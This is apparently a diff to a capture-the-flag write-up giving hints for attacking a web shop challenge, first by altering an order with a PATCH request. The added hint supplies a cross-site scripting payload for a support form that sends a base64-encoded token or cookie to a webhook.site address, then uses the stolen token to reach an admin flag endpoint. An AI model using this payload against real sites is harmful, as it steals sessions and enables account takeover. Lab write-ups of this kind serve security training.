@@ -13,3 +13,16 @@
   * Change it to `PATCH https://[link]/api/orders/2`
   * And add ```Content-Type : application/json```
   * Place another order and send the changes immediately;
+
+
+* Hint : **Ask support.**
+
+  * In Support
+    ```text
+    <img src=x onerror="this.src='https://webhook.site/<link>/?s='+btoa(localStorage.token||document.cookie||'none')">
+    ```
+  * In webhook you will get string encoded in base64
+  * Use base64 to get token
+  * Paste in local storage token and refresh
+  * In `/api/admin/flag` 
+
